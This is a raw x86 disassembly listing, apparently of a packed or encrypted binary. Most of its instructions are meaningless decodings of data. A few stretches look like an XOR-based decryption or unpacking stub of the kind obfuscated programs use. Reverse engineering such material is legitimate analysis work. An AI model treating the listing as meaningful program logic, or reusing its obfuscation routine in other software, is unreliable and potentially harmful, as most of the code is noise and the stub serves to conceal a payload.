  4079e2:	ins    DWORD PTR es:[edi],dx
  4079e3:	inc    esp
  4079e4:	popa   
  4079e5:	adc    DWORD PTR [eax-0x4e],ebp
  4079e8:	or     edi,DWORD PTR [edi-0x5c212460]
  4079ee:	cmp    ebx,esi
  4079f0:	mov    ah,0x56
  4079f2:	int3   
  4079f3:	sub    DWORD PTR [esi+0xd],ebx
  4079f6:	and    eax,0x4580748e
  4079fb:	mov    ebx,0x53cfc36f
  407a00:	fsub   DWORD PTR [ebx+edx*4]
  407a03:	push   esp
  407a04:	stos   DWORD PTR es:[edi],eax
  407a05:	dec    edi
  407a06:	leave  
  407a07:	mov    al,ds:0x79f91140
  407a0c:	in     eax,0x72
  407a0e:	mov    cl,0x4
  407a10:	xchg   ebp,eax
  407a11:	push   edx
  407a12:	jo     0x407a8b
  407a14:	xchg   BYTE PTR [esi-0x50511b56],bh
  407a1a:	pop    esp
  407a1b:	dec    DWORD PTR [edi+0x4]
  407a1e:	mov    ds:0x572c9e70,eax
  407a23:	test   al,0x62
  407a25:	adc    DWORD PTR ds:0x9d55acc,ebp
  407a2b:	cmp    BYTE PTR [edi+0x1d8755ed],ah
  407a31:	outs   dx,DWORD PTR ds:[esi]
  407a32:	jmp    0xf9e98d8c
  407a37:	inc    esp
  407a38:	loope  0x407a91
  407a3a:	sbb    ch,dl
  407a3c:	cmp    esi,DWORD PTR [edx+0x5b95cf09]
  407a42:	push   edx
  407a43:	aad    0xc5
  407a45:	jg     0x407a49
  407a47:	dec    edi
  407a48:	mov    edi,0x9531d8d0
  407a4d:	mul    BYTE PTR [ebp-0x37f242b6]
  407a53:	and    cl,BYTE PTR [ecx]
  407a55:	lds    esi,FWORD PTR [ebx-0x2f]
  407a58:	ins    BYTE PTR es:[edi],dx
  407a59:	pushf  
  407a5a:	or     ecx,DWORD PTR [ebx+ebx*8+0xb]
  407a5e:	jo     0x407a23
  407a60:	lock dec esi
  407a62:	jmp    0xa1ed:0xf5103afc
  407a69:	jnp    0x407a41
  407a6b:	dec    edi
  407a6c:	(bad)  
  407a6d:	int    0x28
  407a6f:	mov    bh,0x71
  407a71:	scas   eax,DWORD PTR es:[edi]
  407a72:	xchg   edx,eax
  407a73:	rcr    DWORD PTR ds:0xd65e422b,1
  407a79:	mov    edx,0x2d073a34
  407a7e:	repz scas al,BYTE PTR es:[edi]
  407a80:	stos   DWORD PTR es:[edi],eax
  407a81:	xor    al,0x93
  407a83:	inc    edx
  407a84:	and    al,BYTE PTR [edi-0x2ed6df51]
  407a8a:	add    eax,0x3d17c35d
  407a8f:	adc    esp,0x2583fe96
  407a95:	addr16 dec edi
  407a97:	sbb    dl,BYTE PTR [ebx+0x41]
  407a9a:	sbb    DWORD PTR ds:0x3565aa0e,ebp
  407aa0:	dec    edi
  407aa1:	test   BYTE PTR [ebx-0x5b],dh
  407aa4:	push   edi
  407aa5:	dec    ebx
  407aa6:	ins    BYTE PTR es:[edi],dx
  407aa7:	sahf   
  407aa8:	retf   
  407aa9:	push   cs
  407aaa:	mov    ds:0x8cab67ff,eax
  407aaf:	scas   al,BYTE PTR es:[edi]
  407ab0:	and    ah,ch
  407ab2:	popa   
  407ab3:	inc    esi
  407ab4:	lods   eax,DWORD PTR ds:[esi]
  407ab5:	xchg   ecx,eax
  407ab6:	lods   al,BYTE PTR ds:[esi]
  407ab7:	push   edi
  407ab8:	ins    BYTE PTR es:[edi],dx
  407ab9:	cmp    edx,0x3d1e626e
  407abf:	or     eax,0xdca4aa0a
  407ac4:	or     DWORD PTR [esi+edx*4+0x59b3eab2],eax
  407acb:	imul   esp
  407acd:	test   BYTE PTR [edi],ah
  407acf:	mov    ax,ds:0x49ff6ca1
  407ad5:	cdq    
  407ad6:	jle    0x407b36
  407ad8:	dec    esi
  407ad9:	les    esp,FWORD PTR [ebp+0x7]
  407adc:	pop    ebp
  407add:	arpl   WORD PTR [eax+0x39],sp
  407ae0:	mov    esi,0xd59f346a
  407ae5:	jo     0x407b3b
  407ae7:	retf   0x2869
  407aea:	jne    0x407aa5
  407aec:	mov    ds:0xed0c87de,eax
  407af1:	add    dh,BYTE PTR [ebx-0x3fddcb8b]
  407af7:	(bad)  
  407af8:	sbb    eax,DWORD PTR [esi-0x4a]
  407afb:	mov    eax,DWORD PTR [ebp-0x10]
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	mov    ecx,0x5940298e
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407ae7
  407b40:	fmulp  st(6),st
  407b42:	popa   
  407b43:	xchg   BYTE PTR [esi],bl
  407b45:	mov    edx,0x20300304
  407b4a:	push   esi
  407b4b:	fs cmp esp,esp
  407b4e:	retf   0xb99f
  407b51:	adc    dl,BYTE PTR [ebx]
  407b53:	scas   al,BYTE PTR es:[edi]
  407b54:	mov    ecx,0xa69d8d89
  407b59:	retf   0xcb8e
  407b5c:	mov    esp,0x4990532c
  407b61:	inc    ebx
  407b62:	repz jbe 0x407b96
  407b65:	int    0x9c
  407b67:	aaa    
  407b68:	jecxz  0x407afc
  407b6a:	xor    al,0x12
  407b6c:	or     esi,0x5008bda3
  407b72:	(bad)  
  407b73:	and    BYTE PTR [esi-0x1f22bf39],bh
  407b79:	xchg   esp,eax
  407b7a:	or     DWORD PTR [edx-0x7],0xfd6f6975
  407b81:	(bad)  
  407b82:	push   ecx
  407b83:	dec    eax
  407b84:	xor    eax,0xb7d4e6a3
  407b89:	out    0x82,al
  407b8b:	(bad)  
  407b8c:	pushf  
  407b8d:	jge    0x407b64
  407b8f:	iret   
  407b90:	and    bh,BYTE PTR [edi+esi*8]
  407b93:	mov    esi,0x6401c44c
  407b98:	mov    DWORD PTR [edx],edx
  407b9a:	add    BYTE PTR [esi],ch
  407b9c:	or     cl,dh
  407b9e:	ds sbb ebp,edx
  407ba1:	jp     0x407b33
  407ba3:	mov    eax,ds:0x5e8aff3b
  407ba8:	push   ss
  407ba9:	icebp  
  407baa:	mov    eax,0xc6667fcf
  407baf:	jae    0x407b71
  407bb1:	in     al,dx
  407bb2:	ret    0xcd3a
  407bb5:	fdiv   DWORD PTR [eax]
  407bb7:	lahf   
  407bb8:	outs   dx,BYTE PTR ds:[esi]
  407bb9:	in     eax,dx
  407bba:	add    ebp,DWORD PTR [ebp-0x366ada1c]
  407bc0:	stos   DWORD PTR es:[edi],eax
  407bc1:	inc    esp
  407bc2:	int    0x64
  407bc4:	leave  
  407bc5:	loopne 0x407ba4
  407bc7:	jmp    0xff9a:0xfff0c763
  407bce:	lods   eax,DWORD PTR ds:[esi]
  407bcf:	mov    cl,0x82
  407bd1:	dec    esp
  407bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bd3:	or     DWORD PTR [ebx+0xb294f08],esp
  407bd9:	inc    ebx
  407bda:	mov    al,0x8e
  407bdc:	dec    edi
  407bdd:	dec    esi
  407bde:	mov    bl,BYTE PTR [edi]
  407be0:	inc    ebx
  407be1:	popf   
  407be2:	inc    ecx
  407be3:	(bad)  
  407be4:	outs   dx,BYTE PTR ds:[esi]
  407be5:	xchg   esp,eax
  407be6:	ret    0x9af2
  407be9:	or     ebp,0x7cbd950
  407bef:	pop    ecx
  407bf0:	lahf   
  407bf1:	popa   
  407bf2:	adc    eax,0x287dbc78
  407bf7:	test   al,0x35
  407bf9:	ucomiss xmm6,DWORD PTR [ebx+ebp*1+0x1ee4776]
  407c01:	fmul   DWORD PTR [ecx+0xc]
  407c04:	jmp    0x907e229
  407c09:	add    bh,BYTE PTR ds:0x98710c70
  407c0f:	daa    
  407c10:	push   0xfffffff9
  407c12:	dec    esi
  407c13:	dec    ebp
  407c14:	ds dec esp
  407c16:	sub    al,0xbd
  407c18:	xchg   esi,eax
  407c19:	nop
  407c1a:	pop    esp
  407c1b:	cmp    dl,BYTE PTR [eax]
  407c1d:	push   esi
  407c1e:	lock stos DWORD PTR es:[edi],eax
  407c20:	stc    
  407c21:	push   edi
  407c22:	shl    BYTE PTR [ecx+ebx*1-0x7d],0xa0
  407c27:	and    cl,BYTE PTR ds:0xce690494
  407c2d:	loop   0x407c8c
  407c2f:	sub    esi,DWORD PTR [ebx+0x2e]
  407c32:	nop
  407c33:	fscale 
  407c35:	lds    esi,FWORD PTR ds:0x434687b8
  407c3b:	xor    DWORD PTR [eax-0x4002f2e9],esi
  407c41:	mov    eax,0xcda5687d
  407c46:	stos   BYTE PTR es:[edi],al
  407c47:	mov    al,ds:0xeb347363
  407c4c:	push   edi
  407c4d:	mov    edx,eax
  407c4f:	je     0x407cc9
  407c51:	pusha  
  407c52:	inc    edx
  407c53:	push   ebx
  407c54:	aad    0x0
  407c56:	rcr    BYTE PTR [ebx+0x2a],cl
  407c59:	sbb    BYTE PTR [edi-0xea5ccde],dl
  407c5f:	rcr    BYTE PTR [edi],cl
  407c61:	pop    ebx
  407c62:	inc    edi
  407c63:	mov    ds,WORD PTR [eax+0x22]
  407c66:	xchg   edi,eax
  407c67:	lock mov al,0xfc
  407c6a:	and    DWORD PTR [edx+0xe],ebp
  407c6d:	repz inc edx
  407c6f:	dec    eax
  407c70:	dec    eax
  407c71:	rcr    ecx,0x3a
  407c74:	ret    0xb80f
  407c77:	fistp  QWORD PTR [ebp-0x34]
  407c7a:	gs inc esi
  407c7c:	jp     0x407cde
  407c7e:	inc    edi
  407c7f:	and    edi,ecx
  407c81:	(bad)  [esi+0x4e]
  407c84:	cmp    DWORD PTR [ecx+0x1c],0x851e3dbc
  407c8b:	sbb    eax,ebp
  407c8d:	push   esp
  407c8e:	inc    edx
  407c8f:	mov    bh,0xfd
  407c91:	dec    eax
  407c92:	adc    esp,DWORD PTR [ecx]
  407c94:	sbb    eax,0x592afd7b
  407c99:	push   ecx
  407c9a:	jae    0x407c26
  407c9c:	out    dx,eax
  407c9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c9e:	aaa    
  407c9f:	inc    edx
  407ca0:	jb     0x407c81
  407ca2:	aam    0x54
  407ca4:	xchg   ebp,eax
  407ca5:	push   0x8342150a
  407caa:	jo     0x407ca1
  407cac:	sub    al,0x1
  407cae:	jecxz  0x407c6c
  407cb0:	ins    DWORD PTR es:[edi],dx
  407cb1:	or     BYTE PTR [ebx+edi*1-0x2f03589e],al
  407cb8:	or     al,0x95
  407cba:	lahf   
  407cbb:	dec    edi
  407cbc:	(bad)  
  407cbd:	int    0xc6
  407cbf:	js     0x407cbb
  407cc1:	cmp    eax,DWORD PTR ds:0x1e50151f
  407cc7:	rcr    bh,1
  407cc9:	mov    dl,0x6d
  407ccb:	pop    ds
  407ccc:	sub    BYTE PTR [edi],cl
  407cce:	push   edx
  407ccf:	fild   WORD PTR [edx+0x71]
  407cd2:	popf   
  407cd3:	mul    bl
  407cd5:	ret    0x3753
  407cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd9:	pushf  
  407cda:	rcr    BYTE PTR [edi+0x5803b740],0x48
  407ce1:	push   ebx
  407ce2:	out    0xc2,al
  407ce4:	shr    BYTE PTR [ecx-0x55],0x60
  407ce8:	es or  al,0xda
  407ceb:	rcr    DWORD PTR ds:0x61ec454b,0xb1
  407cf2:	push   eax
  407cf3:	rol    DWORD PTR [esi],0xe8
  407cf6:	imul   ebx,DWORD PTR [eax-0x6054ef8a],0xffffff8c
  407cfd:	push   0x6310b170
  407d02:	seto   BYTE PTR [edx+0x77]
  407d06:	mov    bl,0x8a
  407d08:	out    dx,al
  407d09:	aam    0x3d
  407d0b:	js     0x407d4e
  407d0d:	cmp    al,0xbc
  407d0f:	hlt    
  407d10:	sbb    edx,ecx
  407d12:	(bad)  
  407d13:	mov    esp,0x4a8dffd
  407d18:	cmp    eax,0xc0798f5
  407d1d:	adc    ebp,ebp
  407d1f:	idiv   BYTE PTR [ebp+eiz*1-0x5e71f50f]
  407d26:	jecxz  0x407d1e
  407d28:	out    dx,eax
  407d29:	das    
  407d2a:	mov    esp,0xab0df8dc
  407d2f:	ins    DWORD PTR es:[edi],dx
  407d30:	xchg   ecx,eax
  407d31:	lahf   
  407d32:	push   0xffffffe1
  407d34:	sbb    al,0xe9
  407d36:	xor    esi,ebp
  407d38:	push   esp
  407d39:	cmp    DWORD PTR [esp+ecx*4+0x54334709],edi
  407d40:	ds dec eax
  407d42:	pop    ecx
  407d43:	mov    fs,WORD PTR [ebx-0x50eb9e71]
  407d49:	aaa    
  407d4a:	fnstsw WORD PTR [edi-0x77]
  407d4d:	or     al,0x9c
  407d4f:	imul   ecx,DWORD PTR [esi-0x3a],0xffffff9f
  407d53:	popa   
  407d54:	retf   
  407d55:	add    ebp,ebx
  407d57:	jae    0x407d28
  407d59:	(bad)  
  407d5a:	pop    ebp
  407d5b:	aad    0x29
  407d5d:	mov    ?,WORD PTR [ebx]
  407d5f:	call   0x7031a7c5
  407d64:	in     eax,0x2a
  407d66:	sbb    bh,BYTE PTR [ebp-0x2d7591dc]
  407d6c:	xchg   esi,eax
  407d6d:	cwde   
  407d6e:	pop    ecx
  407d6f:	or     BYTE PTR es:[esi-0x4e6cea1a],bh
  407d76:	int3   
  407d77:	shl    BYTE PTR ds:0x8df0d261,0x3b
  407d7e:	enter  0x5663,0x85
  407d82:	pop    edx
  407d83:	pop    edx
  407d84:	or     BYTE PTR [esi+eax*1-0x47],ah
  407d88:	xchg   esi,eax
  407d89:	vpmulhw xmm7,xmm0,XMMWORD PTR [ebp-0x78]
  407d8e:	and    eax,0x2986f953
  407d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d94:	push   0xa392b5d
  407d99:	or     eax,0x515b82df
  407d9e:	jns    0x407de2
  407da0:	test   DWORD PTR [eax-0x473d15fe],ebx
  407da6:	mov    ds:0xbb1c80d2,al
  407dab:	or     al,ah
  407dad:	int    0x1c
  407daf:	or     edx,DWORD PTR [ebx]
  407db1:	iret   
  407db2:	xchg   ebx,eax
  407db3:	mov    cl,0x18
  407db5:	push   ebp
  407db6:	add    DWORD PTR [esi-0x58],0xffffff97
  407dba:	sub    ebx,DWORD PTR [eiz*8+0x7d423680]
  407dc1:	add    eax,ecx
  407dc3:	bound  ebx,QWORD PTR [ecx+0x4b]
  407dc6:	mov    bl,0x18
  407dc8:	aaa    
  407dc9:	imul   DWORD PTR [edx+0x6fc67483]
  407dcf:	call   0x9c02:0x4c759cdd
  407dd6:	pushf  
  407dd7:	(bad)  
  407dd8:	fisttp WORD PTR [edi+0x5f7ebd84]
  407dde:	inc    ecx
  407ddf:	retw   0xee63
  407de3:	fbld   TBYTE PTR [ecx]
  407de5:	in     eax,dx
  407de6:	fs xchg esp,eax
  407de8:	shl    DWORD PTR ds:0x2df64fd5,cl
  407dee:	pop    edx
  407def:	adc    ebx,DWORD PTR [esi+0x720059c]
  407df5:	mov    bh,0x2a
  407df7:	mov    bl,0x27
  407df9:	xchg   edx,eax
  407dfa:	sub    esp,DWORD PTR [ecx]
  407dfc:	dec    esp
  407dfd:	add    esp,DWORD PTR [ebp+0xbc8f57]
  407e03:	sbb    al,0xf4
  407e05:	shl    DWORD PTR [edi+edi*1+0x3c5284e8],0xec
  407e0d:	sub    ebp,DWORD PTR [ebp-0x2a]
  407e10:	sbb    DWORD PTR [ecx+esi*8-0x3acd76ef],0x2ec1355e
  407e1b:	les    edi,FWORD PTR [ebx+0x48]
  407e1e:	mov    ds:0xa750075,al
  407e23:	sbb    dh,0x51
  407e26:	lods   al,BYTE PTR ds:[esi]
  407e27:	scas   eax,DWORD PTR es:[edi]
  407e28:	repz jb 0x407e3a
  407e2b:	mov    cl,0x22
  407e2d:	add    dl,bl
  407e2f:	dec    ebp
  407e30:	xchg   ebp,eax
  407e31:	sub    DWORD PTR [ecx-0x1d101aa],edi
  407e37:	mov    ds:0x45c6f274,al
  407e3c:	or     BYTE PTR [edx+edi*1],cl
  407e3f:	mov    esi,0x4fd52c58
  407e44:	scas   eax,DWORD PTR es:[edi]
  407e45:	ret    0xe75d
  407e48:	or     eax,0x648acd1d
  407e4d:	adc    DWORD PTR [edx],esi
  407e4f:	int    0x11
  407e51:	(bad)  
  407e52:	mov    dh,0x21
  407e54:	enter  0x8848,0x6c
  407e58:	scas   al,BYTE PTR es:[edi]
  407e59:	mov    esp,DWORD PTR [edi+ebx*8-0x5f]
  407e5d:	add    BYTE PTR [ebx+0x1c],0xc0
  407e61:	xor    BYTE PTR [eax+0x3858dcb4],dh
  407e67:	pop    edx
  407e68:	pop    es
  407e69:	fisubr WORD PTR [ebp-0x15]
  407e6c:	push   0x1
  407e6e:	cmp    DWORD PTR [eax-0x52],ebx
  407e71:	push   ebx
  407e72:	and    BYTE PTR [eax-0x68],cl
  407e75:	sahf   
  407e76:	mov    ds:0x4215f58d,al
  407e7b:	dec    eax
  407e7c:	shr    DWORD PTR [edx+0x678759ce],cl
  407e82:	je     0x407e60
  407e84:	sub    eax,0xe87472ad
  407e89:	fsubr  DWORD PTR [edi]
  407e8b:	adc    BYTE PTR [ebp+esi*2+0x7e],dh
  407e8f:	jg     0x407e11
  407e91:	jno    0x407ea2
  407e93:	pop    esp
  407e94:	dec    edx
  407e95:	int    0xb6
  407e97:	push   ebx
  407e98:	xchg   DWORD PTR [ecx+esi*8-0x2b62e9e2],eax
  407e9f:	xor    bh,BYTE PTR ds:0x315b8da
  407ea5:	retf   
  407ea6:	inc    ebx
  407ea7:	mov    dh,0xcb
  407ea9:	(bad)  
  407eaa:	in     al,dx
  407eab:	sahf   
  407eac:	inc    edi
  407ead:	or     BYTE PTR [esi+edi*2-0xa],0x30
  407eb2:	loope  0x407eb8
  407eb4:	out    0x95,eax
  407eb6:	in     al,dx
  407eb7:	mov    ch,0x76
  407eb9:	xchg   BYTE PTR ds:0xb145f7c3,ch
  407ebf:	add    esi,DWORD PTR [edi+0x66]
  407ec2:	add    al,0x4d
  407ec4:	in     eax,0x73
  407ec6:	(bad)  
  407ec8:	clc    
  407ec9:	xor    al,0x32
  407ecb:	retf   0xf27f
  407ece:	cwde   
  407ecf:	pop    esi
  407ed0:	push   es
  407ed1:	ret    0x1662
  407ed4:	dec    ebp
  407ed5:	push   ds
  407ed6:	sti    
  407ed7:	fmul   st,st(4)
  407ed9:	jmp    0x407ea9
  407edb:	cdq    
  407edc:	cmc    
  407edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ede:	xor    al,0x91
  407ee0:	jno    0x407e71
  407ee2:	rcl    bl,cl
  407ee4:	push   ecx
  407ee5:	mov    bh,0xd7
  407ee7:	into   
  407ee8:	push   0xffffff9e
  407eea:	pop    es
  407eeb:	call   0xdc90b780
  407ef0:	aaa    
  407ef1:	xor    edx,DWORD PTR [edi]
  407ef3:	xor    al,0xe8
  407ef5:	mov    dh,0x57
  407ef7:	mov    ds:0x91b37825,al
  407efc:	sar    edx,cl
  407efe:	add    ecx,ecx
  407f00:	jb     0x407f2d
  407f02:	ret    
  407f03:	push   0x43af6430
  407f08:	pop    edi
  407f09:	iret   
  407f0a:	xchg   esp,eax
  407f0b:	ins    BYTE PTR es:[edi],dx
  407f0c:	or     eax,0x660d9a97
  407f11:	cmp    eax,DWORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f7e
  407f78:	ret    
  407f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f7a:	mov    ch,BYTE PTR [edx+0x4f7e7ed2]
  407f80:	jns    0x408000
  407f82:	jle    0x407faf
  407f84:	inc    esp
  407f85:	aam    0x95
  407f87:	(bad)  
  407f88:	dec    edi
  407f89:	pushf  
  407f8a:	xchg   edi,eax
  407f8b:	mov    ah,0x1c
  407f8d:	add    BYTE PTR [esi-0x55],bh
  407f90:	imul   edx,ebx,0x2c0a1469
  407f96:	sar    ah,cl
  407f98:	jno    0x407fe7
  407f9a:	jbe    0x407ff7
  407f9c:	add    eax,0xa37c9c0e
  407fa1:	imul   ebx,ebp,0xffffffbf
  407fa4:	mov    dh,0x9
  407fa6:	and    BYTE PTR [ecx-0x1b],bh
  407fa9:	aad    0x38
  407fab:	enter  0x8393,0xb5
  407faf:	daa    
  407fb0:	mov    dl,0xbb
  407fb2:	jne    0x407f70
  407fb4:	leave  
  407fb5:	cmp    BYTE PTR [bx+di-0x14],bh
  407fb9:	inc    edi
  407fba:	push   ebp
  407fbb:	push   ss
  407fbc:	and    ecx,DWORD PTR [ecx]
  407fbe:	fimul  WORD PTR [edx+0x2]
  407fc1:	pop    esi
  407fc2:	into   
  407fc3:	pushf  
  407fc4:	ret    
  407fc5:	call   0x6fae:0xf778245e
  407fcc:	and    DWORD PTR [edx],eax
  407fce:	mov    ds:0xa74f9925,eax
  407fd3:	push   eax
  407fd4:	jo     0x407f78
  407fd6:	pusha  
  407fd7:	scas   al,BYTE PTR es:[edi]
  407fd8:	push   0xffffff96
  407fda:	mov    ebp,0x7302e717
  407fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fe0:	into   
  407fe1:	inc    edx
  407fe2:	in     eax,dx
  407fe3:	clc    
  407fe4:	gs pop ecx
  407fe6:	add    BYTE PTR [ecx+0x61],al
  407fe9:	fs out dx,eax
  407feb:	not    DWORD PTR [ebx+0x13]
  407fee:	push   edx
  407fef:	adc    DWORD PTR ds:0xa0f0b218,esp
  407ff5:	test   BYTE PTR [edx],cl
  407ff7:	imul   edi,DWORD PTR [ecx],0xb55502f
  407ffd:	sub    bh,BYTE PTR [esi]
  407fff:	sub    al,0xd
  408001:	les    edx,FWORD PTR [ebp+edx*4-0x25]
  408005:	idiv   DWORD PTR [ebp*8+0x3e01741f]
  40800c:	pop    ebx
  40800d:	mov    edx,esp
  40800f:	icebp  
  408010:	sbb    eax,DWORD PTR [edx-0x3f61066d]
  408016:	loop   0x407fba
  408018:	out    0x9b,eax
  40801a:	sub    BYTE PTR [edi],dh
  40801c:	dec    ebx
  40801d:	cmc    
  40801e:	sub    dl,dl
  408020:	cli    
  408021:	inc    esi
  408022:	fwait
  408023:	dec    esi
  408024:	pop    ecx
  408025:	sub    eax,0x648f067d
  40802a:	push   esi
  40802b:	sahf   
  40802c:	test   DWORD PTR [eax-0x18],ecx
  40802f:	xchg   ecx,eax
  408030:	mov    bl,0x7c
  408032:	jg     0x407ff2
  408034:	push   edx
  408035:	test   al,0x96
  408037:	xor    DWORD PTR [eax+edx*1+0x4b],ebp
  40803b:	jno    0x4080ba
  40803d:	inc    edi
  40803e:	xor    BYTE PTR [eax+0xf],dh
  408041:	daa    
  408042:	xor    eax,DWORD PTR [ebx-0x46dcdcb7]
  408048:	scas   al,BYTE PTR es:[edi]
  408049:	push   ss
  40804a:	mov    bl,0xd4
  40804c:	aas    
  40804d:	adc    eax,0x72be03bb
  408052:	xchg   ebx,eax
  408053:	pop    es
  408054:	jno    0x408096
  408056:	pop    edi
  408057:	(bad)  
  408058:	jmp    0x37394ada
  40805d:	rol    BYTE PTR [esi],cl
  40805f:	fsub   st(1),st
  408061:	push   esi
  408062:	sub    al,0xed
  408064:	sbb    DWORD PTR [ebp-0x65],edx
  408067:	fstp   DWORD PTR [edx]
  408069:	jp     0x408055
  40806b:	mov    BYTE PTR [esi-0x4],bh
  40806e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806f:	jecxz  0x4080af
  408071:	outs   dx,BYTE PTR ds:[esi]
  408072:	lods   eax,DWORD PTR ds:[esi]
  408073:	jmp    0x8e46:0xe1659d71
  40807a:	xlat   BYTE PTR ds:[ebx]
  40807b:	inc    esi
  40807c:	test   BYTE PTR [edx],al
  40807e:	mov    edx,0xe4344ba5
  408083:	mov    bl,0x6
  408085:	rcl    DWORD PTR [eax],0x13
  408088:	fistp  WORD PTR [ebx+0x4a4f3dce]
  40808e:	add    ebp,DWORD PTR [ebp+0x437c8ffe]
  408094:	mov    DWORD PTR [edx-0xf3edf53],esp
  40809a:	sahf   
  40809b:	mov    esp,0xa9fc7d2a
  4080a0:	ss int 0x95
  4080a3:	test   eax,0x58f2b0e1
  4080a8:	imul   edi,DWORD PTR [esi+0x6955abed],0xb13f65a0
  4080b2:	mov    ecx,0x426fe4c
  4080b7:	pop    ecx
  4080b8:	jb     0x4080b9
  4080ba:	into   
  4080bb:	ror    DWORD PTR [edi+esi*4-0x41089b16],1
  4080c2:	sbb    al,0x7
  4080c4:	sub    esp,DWORD PTR [edi]
  4080c6:	cdq    
  4080c7:	popf   
  4080c8:	adc    al,0x71
  4080ca:	repz push eax
  4080cc:	int    0xd1
  4080ce:	int3   
  4080cf:	loopne 0x408120
  4080d1:	push   ds
  4080d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080d3:	cmp    al,0xb
  4080d5:	pop    ss
  4080d6:	cmc    
  4080d7:	xchg   ecx,eax
  4080d8:	lods   eax,DWORD PTR ds:[esi]
  4080d9:	scas   al,BYTE PTR es:[edi]
  4080da:	adc    bh,BYTE PTR [edi+edi*4-0x6f]
  4080de:	xor    DWORD PTR [esi-0x64427552],eax
  4080e4:	jg     0x4080d7
  4080e6:	sub    BYTE PTR [edi],bh
  4080e8:	pop    eax
  4080e9:	inc    edx
  4080ea:	ins    BYTE PTR es:[edi],dx
  4080eb:	sub    eax,0xf09108bf
  4080f0:	xchg   ebp,eax
  4080f1:	les    esi,FWORD PTR [eax-0x49]
  4080f4:	lods   al,BYTE PTR ds:[esi]
  4080f5:	push   eax
  4080f6:	sub    al,0x1a
  4080f8:	and    al,0x41
  4080fa:	push   ecx
  4080fb:	lock sbb eax,0x17c075ee
  408101:	dec    eax
  408102:	rcl    DWORD PTR [ebx],1
  408104:	js     0x40814c
  408106:	stos   BYTE PTR es:[edi],al
  408107:	jg     0x40815d
  408109:	xchg   BYTE PTR [ebp+0x4d7826f1],bh
  40810f:	and    esp,eax
  408111:	int3   
  408112:	js     0x4080c1
  408114:	daa    
  408115:	call   0x52881cbe
  40811a:	dec    ebx
  40811b:	sub    edi,DWORD PTR ds:0x944b16c9
  408121:	in     eax,dx
  408122:	mov    ah,0x60
  408124:	aam    0x18
  408126:	jbe    0x408111
  408128:	aas    
  408129:	push   edi
  40812a:	nop
  40812b:	loope  0x4080c1
  40812d:	mov    edx,0xa90e8e0c
  408132:	push   es
  408133:	leave  
  408134:	sbb    DWORD PTR [ecx-0x7248d897],ebx
  40813a:	push   edi
  40813b:	aas    
  40813c:	inc    edi
  40813d:	mov    dl,0x21
  40813f:	push   ebp
  408140:	push   ds
  408141:	mov    eax,0x1e4003c6
  408146:	add    ah,BYTE PTR [edx+0xc]
  408149:	mov    eax,0x119e1d52
  40814e:	xchg   esp,eax
  40814f:	inc    DWORD PTR [ebp+ecx*1-0x28f24757]
  408156:	jg     0x40810a
  408158:	jne    0x408193
  40815a:	sub    bl,BYTE PTR [edi-0x7d0dfd07]
  408160:	iret   
  408161:	xor    edx,edi
  408163:	push   ecx
  408164:	fsubr  DWORD PTR [ecx+edi*2]
  408167:	jnp    0x408154
  408169:	xchg   esp,eax
  40816a:	mov    eax,0x412df637
  40816f:	xor    BYTE PTR [esi-0x57d2e6dc],dh
  408175:	fcmove st,st(4)
  408177:	in     al,0x38
  408179:	mov    esp,DWORD PTR [ecx-0x72]
  40817c:	shr    bh,0x4d
  40817f:	imul   ecx,esi,0x7fa7846
  408185:	aad    0xe0
  408187:	aad    0x2d
  408189:	pop    esi
  40818a:	std    
  40818b:	cmp    eax,0x4f3a2141
  408190:	retf   
  408191:	mov    ds:0xefa7843e,eax
  408196:	fistp  QWORD PTR [ebx+edi*8+0x5b5b4983]
  40819d:	pop    eax
  40819e:	leave  
  40819f:	push   esp
  4081a0:	ror    DWORD PTR [edi+0x45be6fc1],cl
  4081a6:	mov    BYTE PTR [edx+eiz*4+0x1ebb8041],0x68
  4081ae:	push   es
